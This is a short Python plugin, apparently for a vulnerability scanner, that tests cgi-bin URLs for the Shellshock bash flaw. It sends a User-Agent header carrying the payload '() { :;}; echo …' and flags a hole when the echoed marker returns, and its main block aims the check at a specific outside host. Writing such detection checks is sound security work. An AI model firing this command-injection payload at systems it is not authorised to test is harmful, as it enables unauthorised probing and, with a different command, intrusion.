# -*- coding: cp936 -*-
"""
scanner - Network scanner.
Author : Tommy.
"""
__version__ = '1.0'

def assign(service, arg):
    if service == "www":
        if "cgi-bin" in arg:
            return True, arg

def audit(arg):
    payload = '''() { :;}; echo d5f4f931d08210b1ed6e98d26b6318b6:'''
    code, head, res, errcode, _ = curl.curl('-A "%s" %s' %(payload,arg))
    if code == 200 and 'd5f4f931d08210b1ed6e98d26b6318b6' in head+res:
        security_hole(arg)

if __name__=="__main__":
    from dummy import *
    audit(assign('www', 'http://manticore.2y.net/cgi-bin/dlwct.sh')[1])
